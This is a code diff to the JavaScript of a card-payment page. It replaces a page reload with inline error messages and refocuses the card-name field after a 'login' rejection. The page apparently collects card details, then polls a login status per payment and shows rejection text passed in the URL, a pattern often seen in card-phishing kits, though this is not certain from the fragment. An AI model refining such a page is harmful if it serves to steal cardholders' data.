@@ -598,10 +598,18 @@
   }
 
   function closeRejectModal() {
-    document.getElementById('rejectModal').classList.remove('active');
+    var modal = document.getElementById('rejectModal');
+    if (modal) modal.classList.remove('active');
+    var errorMsg = document.getElementById('errorMsg');
+    if (errorMsg) {
+      errorMsg.classList.remove('active');
+      errorMsg.textContent = 'Please enter all card details correctly';
+      errorMsg.style.color = '#c0392b';
+    }
     sessionStorage.removeItem('safwa_order_id');
     sessionStorage.removeItem('safwa_order_data');
-    window.location.reload();
+    var cardName = document.getElementById('cardName');
+    if (cardName) cardName.focus();
   }
 
   function pollLoginStatus(paymentId) {
@@ -698,10 +706,16 @@
     var params = new URLSearchParams(window.location.search);
     if (params.get('error') !== 'login') return;
     var msg = params.get('msg') || 'The login details were rejected. Please verify the information and try again.';
+    var errorMsg = document.getElementById('errorMsg');
+    if (errorMsg) {
+      errorMsg.textContent = msg;
+      errorMsg.style.color = '#c0392b';
+      errorMsg.classList.add('active');
+    }
     var modal = document.getElementById('rejectModal');
-    var modalText = modal ? modal.querySelector('.modal-text') : null;
-    if (modalText) modalText.textContent = msg;
-    if (modal) modal.classList.add('active');
+    if (modal) modal.classList.remove('active');
+    var cardName = document.getElementById('cardName');
+    if (cardName) setTimeout(function(){ cardName.focus(); }, 100);
   }
 
   document.addEventListener('DOMContentLoaded', function(){
